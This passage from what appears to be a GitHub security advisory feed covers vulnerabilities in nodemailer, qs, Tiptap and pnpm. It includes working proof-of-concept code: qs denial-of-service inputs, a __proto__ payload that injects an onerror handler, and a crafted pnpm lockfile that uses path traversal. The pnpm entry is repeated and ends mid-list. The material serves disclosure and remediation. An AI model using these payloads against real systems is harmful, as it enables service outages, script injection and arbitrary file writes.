<li><a href="https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.112">https://github.com/ondata/ckan-mcp-server/releases/tag/v0.4.112</a></li>
<li><a href="https://github.com/advisories/GHSA-83x6-42hr-jc76">https://github.com/advisories/GHSA-83x6-42hr-jc76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83x6-42hr-jc76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T14:52:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Duplicate Advisory: Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message]]></title>
        <id>https://github.com/advisories/GHSA-h3hj-cmcx-xc66</id>
        <link href="https://github.com/advisories/GHSA-h3hj-cmcx-xc66"/>
        <updated>2026-09-02T14:47:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-p6gq-j5cr-w38f. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>nodemailer before 9.0.1 fails to apply disableFileAccess and disableUrlAccess flags to message-level raw option, allowing authenticated attackers to read arbitrary files or perform server-side request forgery by supplying path or href properties. Attackers can exploit this by crafting raw messages with file paths or URLs that bypass the intended sandbox, with fetched content delivered in the outgoing message to attacker-controlled recipients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82659">https://nvd.nist.gov/vuln/detail/CVE-2026-82659</a></li>
<li><a href="https://www.vulncheck.com/advisories/nodemailer-before-9.0.1-file-read-and-ssrf-via-raw-option">https://www.vulncheck.com/advisories/nodemailer-before-9.0.1-file-read-and-ssrf-via-raw-option</a></li>
<li><a href="https://github.com/advisories/GHSA-h3hj-cmcx-xc66">https://github.com/advisories/GHSA-h3hj-cmcx-xc66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3hj-cmcx-xc66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-31T09:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qs] qs array-limit bypass via bracket-key comma parsing]]></title>
        <id>https://github.com/advisories/GHSA-x5fp-wj9c-mxmx</id>
        <link href="https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"/>
        <updated>2026-09-02T14:46:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>qs</code> <code>v6.15.3</code> allows bracket-key input to bypass <code>arrayLimit</code> and <code>throwOnLimitExceeded</code> when <code>comma: true</code>. The input <code>a[]=1,2,3,4</code> succeeds with <code>arrayLimit: 3</code>, while the equivalent plain-key input is rejected.</p>
<p>Affected version tested:</p>
<pre><code class="language-text">qs v6.15.3
commit 18d085e919dae70c8f1b200ab99323058edab2c2
</code></pre>
<h3 id="details">Details</h3>
<p><code>parseArrayValue()</code> enforces the comma limit only for flat values. The <code>a[]</code> form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">const qs = require('qs')
const options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }

const result = qs.parse('a[]=1,2,3,4', options)
console.log(result.a[0].length) // 4; expected RangeError

const big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })
console.log(big.a[0].length) // 1000001
</code></pre>
<p>On <code>v6.15.3</code>, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent <code>a=1,2,3,4</code> input throws <code>RangeError</code> as expected.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883">https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883</a></li>
<li><a href="https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx">https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82562">https://nvd.nist.gov/vuln/detail/CVE-2026-82562</a></li>
<li><a href="https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464">https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464</a></li>
<li><a href="https://github.com/advisories/GHSA-x5fp-wj9c-mxmx">https://github.com/advisories/GHSA-x5fp-wj9c-mxmx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5fp-wj9c-mxmx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T14:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qs] qs: Denial of Service via Attacker Controlled isBuffer]]></title>
        <id>https://github.com/advisories/GHSA-4mjr-xmp4-gh2g</id>
        <link href="https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"/>
        <updated>2026-09-02T14:45:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>qs.stringify()</code> calls <code>utils.isBuffer()</code> on every value it serializes, and <code>utils.isBuffer()</code> invokes <code>obj.constructor.isBuffer(obj)</code> without checking that it is callable. A value whose own <code>constructor.isBuffer</code> is a non-function makes <code>qs</code> call a non-callable and throw <code>TypeError</code>. Such a value is produced <strong>by <code>qs.parse</code> itself</strong> from an untrusted query string when <code>plainObjects: true</code> or <code>allowPrototypes: true</code> is set, so a pure-<code>qs</code> <code>parse</code> → <code>stringify</code> round-trip — no <code>JSON.parse</code> — turns an unauthenticated query string into an uncaught throw.</p>
<p>An attacker-controlled <code>parse</code> input reaches the host application's availability asset — via <code>qs</code>'s own recommended <code>plainObjects</code> mitigation — and triggers an uncaught exception during a <code>parse</code> → <code>stringify</code> round-trip.</p>
<h3 id="details">Details</h3>
<p><code>utils.isBuffer</code> runs at <code>lib/stringify.js:127</code> for every serialized value:</p>
<pre><code class="language-js">if (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }
</code></pre>
<p><code>utils.isBuffer</code> (<code>lib/utils.js:327-333</code>) invokes <code>obj.constructor.isBuffer</code> without verifying it is callable:</p>
<pre><code class="language-js">var isBuffer = function isBuffer(obj) {
    if (!obj || typeof obj !== 'object') { return false; }
    return !!(obj.constructor &amp;&amp; obj.constructor.isBuffer &amp;&amp; obj.constructor.isBuffer(obj));
};
</code></pre>
<p><code>constructor</code> and <code>isBuffer</code> are ordinary keys. <code>qs.parse</code> with <code>plainObjects: true</code> or <code>allowPrototypes: true</code> keeps them as own properties, so the parsed value carries a non-function <code>constructor.isBuffer</code>; <code>stringify</code> then calls a non-callable and throws <code>TypeError</code>. By contrast <code>utils.isRegExp</code> uses a brand check (<code>Object.prototype.toString</code>); the missing guard here is an internal inconsistency, not a platform limitation.</p>
<h3 id="trust-boundary-note">Trust Boundary Note</h3>
<p><code>qs.stringify</code> alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by <strong><code>qs.parse</code>, whose input is untrusted by design</strong>. <code>qs.parse</code> normally strips a <code>constructor</code> key via its prototype guard, but with the documented options <code>plainObjects: true</code> or <code>allowPrototypes: true</code> the key survives and lands as an own property. Feeding the parsed object back into <code>qs.stringify</code> — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. </p>
<h3 id="poc">PoC</h3>
<p><code>poc02c_isBuffer_qs_only_roundtrip.js</code> — pure-<code>qs</code> chain, no <code>JSON.parse</code>; an untrusted query string alone reaches the throw:</p>
<pre><code class="language-js">'use strict';
var qs = require('qs');

var untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y

var parsed = qs.parse(untrustedQueryString, { plainObjects: true });
console.log('[parse] kept constructor key:', JSON.stringify(parsed));

try {
    qs.stringify(parsed);
    console.log('[stringify] no throw (unexpected)');
} catch (e) {
    console.log('[stringify] DoS reproduced -&gt;', e.constructor.name + ':', e.message);
}
</code></pre>
<p><code>poc02_isBuffer.js</code> — the minimal defect:</p>
<pre><code class="language-js">'use strict';
var qs = require('qs');
try {
    qs.stringify(JSON.parse('{"a":{"constructor":{"isBuffer":"x"}}}'));
} catch (e) {
    console.log('[A] DoS reproduced -&gt;', e.constructor.name + ':', e.message);
}
</code></pre>
<p><code>poc02b_isBuffer_async_crash.js</code> — worker death in an async sink:</p>
<pre><code class="language-js">'use strict';
var qs = require('qs');

function handleRequestAsync(clientJsonBody) {
    try {
        setImmediate(function () {                 // async continuation, outside the try
            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught
        });
        console.log('[handler] returned 200 synchronously; async work scheduled');
    } catch (e) {
        console.log('[handler] caught synchronously (will NOT happen):', e.message);
    }
}
process.on('exit', function (code) {
    console.log('[proc] process exiting with code:', code);
});
handleRequestAsync('{"filters":{"constructor":{"isBuffer":"x"}}}');
</code></pre>
<h3 id="execution-steps">Execution Steps</h3>
<pre><code class="language-bash">cd poc
npm install qs@6.15.3
node poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-&gt;stringify -&gt; TypeError
node poc02_isBuffer.js                      # minimal defect -&gt; TypeError inside stringify
node poc02b_isBuffer_async_crash.js         # async sink -&gt; uncaught throw -&gt; exit code 1
</code></pre>
<h3 id="reproduction-evidence">Reproduction Evidence</h3>
<p><code>poc02c_isBuffer_qs_only_roundtrip.js</code> :</p>
<pre><code>[parse] kept constructor key: {"x":{"constructor":{"isBuffer":"y"}}}
[stringify] DoS reproduced -&gt; TypeError: obj.constructor.isBuffer is not a function
</code></pre>
<p><code>poc02_isBuffer.js</code>:</p>
<pre><code>[A] DoS reproduced -&gt; TypeError: obj.constructor.isBuffer is not a function
</code></pre>
<p><code>poc02b_isBuffer_async_crash.js</code> :</p>
<pre><code>[handler] returned 200 synchronously; async work scheduled
[proc] process exiting with code: 1
TypeError: obj.constructor.isBuffer is not a function
    at Object.isBuffer (.../qs/lib/utils.js:332:78)
    at stringify (.../qs/lib/stringify.js:127:45)
=== EXIT CODE: 1 ===
</code></pre>
<p>The pure-<code>qs</code> round-trip shows the malicious shape originates from <code>qs.parse</code> of an untrusted query string, with no <code>JSON.parse</code>. The synchronous <code>try/catch</code> in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated request degrades any endpoint that re-serializes deserialized client data with <code>qs.stringify</code>. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on <code>qs</code>.</p>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Replace the duck-type with a brand check mirroring <code>utils.isRegExp</code>:</p>
<pre><code class="language-js">var isBuffer = function isBuffer(obj) {
    if (!obj || typeof obj !== 'object') { return false; }
    if (typeof Buffer !== 'undefined' &amp;&amp; typeof Buffer.isBuffer === 'function') {
        return Buffer.isBuffer(obj);
    }
    return Object.prototype.toString.call(obj) === '[object Uint8Array]';
};
</code></pre>
<p>If duck-typing must remain, require <code>typeof obj.constructor.isBuffer === 'function'</code> before invoking and wrap the call in <code>try/catch</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g">https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82417">https://nvd.nist.gov/vuln/detail/CVE-2026-82417</a></li>
<li><a href="https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6">https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6</a></li>
<li><a href="https://github.com/advisories/GHSA-4mjr-xmp4-gh2g">https://github.com/advisories/GHSA-4mjr-xmp4-gh2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mjr-xmp4-gh2g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T14:45:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tiptap/core] Tiptap: mergeAttributes() turns an own __proto__ key into inherited executable DOM attributes]]></title>
        <id>https://github.com/advisories/GHSA-cp6q-959q-f8rh</id>
        <link href="https://github.com/advisories/GHSA-cp6q-959q-f8rh"/>
        <updated>2026-09-02T14:44:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>@tiptap/core</code>'s public <code>mergeAttributes()</code> helper uses ordinary bracket assignment on keys returned by <code>Object.entries()</code>. An own <code>__proto__</code> key from JSON therefore invokes the legacy prototype setter on the fresh merged object. The function returns an object whose prototype is attacker-controlled, while <code>Object.keys()</code> and ordinary own-property checks show no attacker attributes.</p>
<p>When that result is used as a ProseMirror DOMOutputSpec attribute object, <code>prosemirror-model</code>'s <code>DOMSerializer.renderSpec()</code> enumerates it with <code>for...in</code> and applies inherited values with <code>setAttribute()</code>. In a browser proof, inherited <code>src</code> and <code>onerror</code> values were copied to an <code>&lt;img&gt;</code> and the error handler executed once. This is per-object prototype manipulation; the proof does not modify global <code>Object.prototype</code>.</p>
<h2 id="root-cause">Root cause</h2>
<p>The affected loop is conceptually:</p>
<pre><code class="language-ts">const mergedAttributes = { ...items }
for (const [key, value] of Object.entries(item)) {
  const exists = mergedAttributes[key]
  // ...
  mergedAttributes[key] = value
}
</code></pre>
<p><code>Object.entries(JSON.parse('{"__proto__": {...}}'))</code> includes <code>__proto__</code>. Reading <code>mergedAttributes['__proto__']</code> resolves the inherited <code>Object.prototype</code>; assigning to the same key invokes <code>Object.prototype.__proto__</code>'s setter and replaces <code>mergedAttributes</code>' prototype.</p>
<h2 id="browser-reproduction">Browser reproduction</h2>
<p>The following shape was tested with exact <code>@tiptap/core</code> 3.29.2 and <code>prosemirror-model</code> 1.25.11:</p>
<pre><code class="language-js">const input = JSON.parse(`{
  "__proto__": {
    "data-inherited-canary": "present",
    "src": "x-invalid://canary",
    "onerror": "globalThis.__tiptapXss += 1"
  }
}`)

const attrs = mergeAttributes(input)
// Object.keys(attrs) === []
// Object.getPrototypeOf(attrs) === input.__proto__

const schema = new Schema({
  nodes: {
    doc: { content: 'image' },
    image: { toDOM: () =&gt; ['img', attrs] },
    text: {},
  },
})
const doc = schema.node('doc', null, [schema.node('image')])
const fragment = DOMSerializer.fromSchema(schema).serializeFragment(doc.content)
document.body.append(fragment)
</code></pre>
<p>Chromium produced an image with <code>data-inherited-canary</code>, <code>src</code>, and <code>onerror</code>; the handler executed exactly once. <code>Object.prototype</code> remained clean.</p>
<h2 id="impact-and-preconditions">Impact and preconditions</h2>
<p>Applications that merge untrusted imported document, plugin, CMS, API, tenant, or AI-derived attribute objects can receive a prototype-manipulated result. Consumers that enumerate inherited keys, including ProseMirror's DOM serializer, can turn the hidden properties into DOM attributes and execute JavaScript in the application's origin. Own-key validation, object spread, JSON serialization, and logging can miss the inherited values. Other component consumers can read inherited authorization or configuration fields.</p>
<p>Tiptap's standard fixed ProseMirror schemas discard unknown document attributes, so arbitrary Tiptap JSON is not automatically exploitable in every application. A vulnerable application needs an untrusted object boundary into <code>mergeAttributes()</code> or a dynamic/custom extension or schema that preserves the relevant attribute object.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>The unsafe assignment was introduced in commit <code>ecadf7ea0a7f8f39a8496a60edf0ac8f379e6eb3</code> and is present in the first package tag <code>@tiptap/core@2.0.0-alpha.0</code>, v2.0.0, v2.27.1, v3.0.0, and current v3.29.2 source. No fixed release was found.</p>
<h2 id="recommended-remediation">Recommended remediation</h2>
<p>Reject <code>__proto__</code> before reading or assigning the key, or define copied keys as own data properties without invoking legacy setters. A minimal hardening is to skip <code>key === '__proto__'</code>. Add regression tests using an own JSON-origin <code>__proto__</code> key and assert that the result keeps <code>Object.prototype</code> as its prototype, exposes no inherited attacker keys, and cannot create an event-handler attribute through <code>DOMSerializer</code>.</p>
<p>This was found during authorized dependency review and is being reported privately. No public zero-day issue has been opened.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ueberdosis/tiptap/security/advisories/GHSA-cp6q-959q-f8rh">https://github.com/ueberdosis/tiptap/security/advisories/GHSA-cp6q-959q-f8rh</a></li>
<li><a href="https://github.com/ueberdosis/tiptap/commit/01d7af8c983ee5954c63734f4fa46cb23ae3246d">https://github.com/ueberdosis/tiptap/commit/01d7af8c983ee5954c63734f4fa46cb23ae3246d</a></li>
<li><a href="https://github.com/ueberdosis/tiptap/releases/tag/v3.30.4">https://github.com/ueberdosis/tiptap/releases/tag/v3.30.4</a></li>
<li><a href="https://github.com/advisories/GHSA-cp6q-959q-f8rh">https://github.com/advisories/GHSA-cp6q-959q-f8rh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cp6q-959q-f8rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T14:44:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Virtual store linker path traversal via unvalidated depPath name in lockfileToDepGraph]]></title>
        <id>https://github.com/advisories/GHSA-c59q-g84q-2gj5</id>
        <link href="https://github.com/advisories/GHSA-c59q-g84q-2gj5"/>
        <updated>2026-09-02T14:37:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The virtual store linker constructs package installation directories using <code>path.join(modules, pkgName)</code> where <code>pkgName</code> is extracted from lockfile <code>packages</code> keys via <code>dp.parse(depPath).name</code> without validation. A crafted <code>pnpm-lock.yaml</code> with traversal sequences in depPath keys (e.g., <code>../../../tmp/pwned@1.0.0</code>) causes package content to be written to arbitrary filesystem paths during <code>pnpm install</code>.</p>
<p>This is an incomplete fix of GHSA-fr4h-3cph-29xv — the <code>safeJoinModulesDir</code> containment helper was applied to the hoisted linker and <code>symlinkDependency</code> but NOT to the virtual store linker's <code>lockfileToDepGraph.ts:233</code>.</p>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p><code>dp.parse()</code> at <code>pnpm11/deps/path/src/index.ts:135</code> extracts the package name as:</p>
<pre><code class="language-typescript">const name = dependencyPath.substring(0, sepIndex)
</code></pre>
<p>This is a raw substring operation with zero validation that <code>name</code> is a valid npm package name. A depPath of <code>../../../tmp/pwned@1.0.0</code> yields <code>name = '../../../tmp/pwned'</code>.</p>
<h3 id="vulnerable-code-path">Vulnerable Code Path</h3>
<ol>
<li><code>pnpm-lock.yaml</code> → <code>lockfile.packages['../../../../../../../tmp/pwned@1.0.0']</code> (attacker-controlled lockfile key)</li>
<li><code>nameVerFromPkgSnapshot(depPath, pkgSnapshot)</code> at <code>lockfile/utils/src/nameVerFromPkgSnapshot.ts:16</code> → calls <code>dp.parse(depPath)</code> → returns <code>{ name: '../../../../../../../tmp/pwned' }</code></li>
<li><code>lockfileToDepGraph.ts:232</code> → <code>modules = path.join(dirInVirtualStore, 'node_modules')</code></li>
<li><code>lockfileToDepGraph.ts:233</code> → <code>dir = path.join(modules, pkgName)</code> → resolves to <code>/tmp/pwned</code> (ESCAPES virtual store)</li>
<li><code>storeController.importPackage(depNode.dir, ...)</code> → writes package content to the traversed path</li>
</ol>
<h3 id="why-existing-defenses-dont-catch-it">Why Existing Defenses Don't Catch It</h3>
<ul>
<li><strong><code>depPathToFilename()</code></strong> — replaces <code>/</code> with <code>+</code> for the <code>dirInVirtualStore</code> path, but <code>pkgName</code> comes SEPARATELY from <code>dp.parse()</code> and is NOT passed through this function</li>
<li><strong><code>verifyLockfileResolutions()</code></strong> — validates dependency map keys (aliases) via <code>isValidDependencyAlias()</code>, but never validates the depPath keys themselves</li>
<li><strong>Lockfile parser</strong> — <code>yaml.load(lockfileRawContent)</code> with no schema validation on <code>packages</code> keys</li>
<li><strong><code>importPackage()</code></strong> — accepts <code>targetDir</code> and passes it directly to <code>cafsStore.importPackage(targetDir, ...)</code> with zero containment check</li>
<li><strong>Integrity verification</strong> — requires a real fetchable package but does not validate the destination path</li>
</ul>
<h3 id="escalation-to-rce-non-default-config">Escalation to RCE (non-default config)</h3>
<p>When <code>dangerouslyAllowAllBuilds: true</code> is configured (or the traversal package name is in the explicit <code>allowBuilds</code> list), the same traversed path is used in the rebuild phase at <code>after-install/src/index.ts:402,470</code>. The attacker's <code>postinstall</code> script then executes with the victim's shell access. Under default config, <code>allowBuild</code> returns false for unknown packages, limiting impact to arbitrary file write.</p>
<h3 id="also-affected-pnp-linker">Also Affected (PnP linker)</h3>
<p>When <code>nodeLinker: pnp</code> is configured, <code>lockfileToPackageRegistry()</code> at <code>lockfile/to-pnp/src/index.ts:105-110</code> uses the same unvalidated <code>dp.parse().name</code> in <code>packageLocation</code> construction, allowing the <code>.pnp.cjs</code> resolver map to point outside the virtual store. This is a lower-impact variant (PnP is not the default linker).</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can commit a crafted <code>pnpm-lock.yaml</code> to a repository (or supply one via a malicious package) can cause arbitrary file writes on the machine of any user who runs <code>pnpm install</code>. Written content is the actual package files from a real npm package (attacker controls which package and which destination).</p>
<p>Targets for arbitrary file write include:</p>
<ul>
<li><code>.git/hooks/pre-commit</code> — code execution on next git operation</li>
<li><code>~/.local/bin/</code> — binary hijacking</li>
<li>Project source files — supply chain injection</li>
</ul>
<h2 id="reproduction">Reproduction</h2>
<p>Craft a <code>pnpm-lock.yaml</code>:</p>
<pre><code class="language-yaml">lockfileVersion: '9.0'
packages:
  ../../../../../../../tmp/pwned@1.0.0:
    resolution: {integrity: sha512-&lt;real-package-integrity&gt;}
    engines: {node: '&gt;=14'}
snapshots:
  ../../../../../../../tmp/pwned@1.0.0: {}
importers:
  .:
    dependencies:
      legitimate-name:
        specifier: ^1.0.0
        version: ../../../../../../../tmp/pwned@1.0.0
</code></pre>
<p>Run <code>pnpm install</code> — package content is written to <code>/tmp/pwned/</code> instead of the virtual store.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply <code>safeJoinModulesDir</code> (or equivalent validation) at:</p>
<ul>
<li><code>lockfileToDepGraph.ts:233</code> — <code>path.join(modules, pkgName)</code></li>
<li><code>after-install/src/index.ts:402</code> — <code>path.join(pkgModulesDir(depPath), pkgInfo.name)</code></li>
<li><code>lockfile/to-pnp/src/index.ts:105-110</code> — PnP <code>packageLocation</code></li>
</ul>
<p>Alternatively, validate depPath keys during lockfile parsing to reject any that don't produce valid npm package names via <code>dp.parse()</code>.</p>
<h2 id="relationship-to-ghsa-fr4h-3cph-29xv">Relationship to GHSA-fr4h-3cph-29xv</h2>
<p>GHSA-fr4h-3cph-29xv fixed the hoisted linker path (<code>lockfileToHoistedDepGraph.ts:222</code>) by adding <code>safeJoinModulesDir</code>. The same fix was NOT applied to the virtual store linker, which uses the identical <code>dp.parse().name → path.join()</code> pattern at <code>lockfileToDepGraph.ts:233</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-c59q-g84q-2gj5">https://github.com/pnpm/pnpm/security/advisories/GHSA-c59q-g84q-2gj5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82392">https://nvd.nist.gov/vuln/detail/CVE-2026-82392</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12890">https://github.com/pnpm/pnpm/pull/12890</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9">https://github.com/pnpm/pnpm/commit/78e29fe5583a1e5d69ea05e414eff310f78d5ed9</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-c59q-g84q-2gj5">https://github.com/advisories/GHSA-c59q-g84q-2gj5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59q-g84q-2gj5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T14:37:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Virtual store linker path traversal via unvalidated depPath name in lockfileToDepGraph]]></title>
        <id>https://github.com/advisories/GHSA-c59q-g84q-2gj5</id>
        <link href="https://github.com/advisories/GHSA-c59q-g84q-2gj5"/>
        <updated>2026-09-02T14:37:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The virtual store linker constructs package installation directories using <code>path.join(modules, pkgName)</code> where <code>pkgName</code> is extracted from lockfile <code>packages</code> keys via <code>dp.parse(depPath).name</code> without validation. A crafted <code>pnpm-lock.yaml</code> with traversal sequences in depPath keys (e.g., <code>../../../tmp/pwned@1.0.0</code>) causes package content to be written to arbitrary filesystem paths during <code>pnpm install</code>.</p>
<p>This is an incomplete fix of GHSA-fr4h-3cph-29xv — the <code>safeJoinModulesDir</code> containment helper was applied to the hoisted linker and <code>symlinkDependency</code> but NOT to the virtual store linker's <code>lockfileToDepGraph.ts:233</code>.</p>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p><code>dp.parse()</code> at <code>pnpm11/deps/path/src/index.ts:135</code> extracts the package name as:</p>
<pre><code class="language-typescript">const name = dependencyPath.substring(0, sepIndex)
</code></pre>
<p>This is a raw substring operation with zero validation that <code>name</code> is a valid npm package name. A depPath of <code>../../../tmp/pwned@1.0.0</code> yields <code>name = '../../../tmp/pwned'</code>.</p>
<h3 id="vulnerable-code-path">Vulnerable Code Path</h3>
<ol>
<li><code>pnpm-lock.yaml</code> → <code>lockfile.packages['../../../../../../../tmp/pwned@1.0.0']</code> (attacker-controlled lockfile key)</li>
<li><code>nameVerFromPkgSnapshot(depPath, pkgSnapshot)</code> at <code>lockfile/utils/src/nameVerFromPkgSnapshot.ts:16</code> → calls <code>dp.parse(depPath)</code> → returns <code>{ name: '../../../../../../../tmp/pwned' }</code></li>
<li><code>lockfileToDepGraph.ts:232</code> → <code>modules = path.join(dirInVirtualStore, 'node_modules')</code></li>
<li><code>lockfileToDepGraph.ts:233</code> → <code>dir = path.join(modules, pkgName)</code> → resolves to <code>/tmp/pwned</code> (ESCAPES virtual store)</li>
<li><code>storeController.importPackage(depNode.dir, ...)</code> → writes package content to the traversed path</li>
</ol>
<h3 id="why-existing-defenses-dont-catch-it">Why Existing Defenses Don't Catch It</h3>
<ul>
<li><strong><code>depPathToFilename()</code></strong> — replaces <code>/</code> with <code>+</code> for the <code>dirInVirtualStore</code> path, but <code>pkgName</code> comes SEPARATELY from <code>dp.parse()</code> and is NOT passed through this function</li>
<li><strong><code>verifyLockfileResolutions()</code></strong> — validates dependency map keys (aliases) via <code>isValidDependencyAlias()</code>, but never validates the depPath keys themselves</li>
<li><strong>Lockfile parser</strong> — <code>yaml.load(lockfileRawContent)</code> with no schema validation on <code>packages</code> keys</li>
<li><strong><code>importPackage()</code></strong> — accepts <code>targetDir</code> and passes it directly to <code>cafsStore.importPackage(targetDir, ...)</code> with zero containment check</li>
<li><strong>Integrity verification</strong> — requires a real fetchable package but does not validate the destination path</li>
</ul>
<h3 id="escalation-to-rce-non-default-config">Escalation to RCE (non-default config)</h3>
<p>When <code>dangerouslyAllowAllBuilds: true</code> is configured (or the traversal package name is in the explicit <code>allowBuilds</code> list), the same traversed path is used in the rebuild phase at <code>after-install/src/index.ts:402,470</code>. The attacker's <code>postinstall</code> script then executes with the victim's shell access. Under default config, <code>allowBuild</code> returns false for unknown packages, limiting impact to arbitrary file write.</p>
<h3 id="also-affected-pnp-linker">Also Affected (PnP linker)</h3>
<p>When <code>nodeLinker: pnp</code> is configured, <code>lockfileToPackageRegistry()</code> at <code>lockfile/to-pnp/src/index.ts:105-110</code> uses the same unvalidated <code>dp.parse().name</code> in <code>packageLocation</code> construction, allowing the <code>.pnp.cjs</code> resolver map to point outside the virtual store. This is a lower-impact variant (PnP is not the default linker).</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can commit a crafted <code>pnpm-lock.yaml</code> to a repository (or supply one via a malicious package) can cause arbitrary file writes on the machine of any user who runs <code>pnpm install</code>. Written content is the actual package files from a real npm package (attacker controls which package and which destination).</p>
<p>Targets for arbitrary file write include:</p>
<ul>
<li><code>.git/hooks/pre-commit</code> — code execution on next git operation</li>
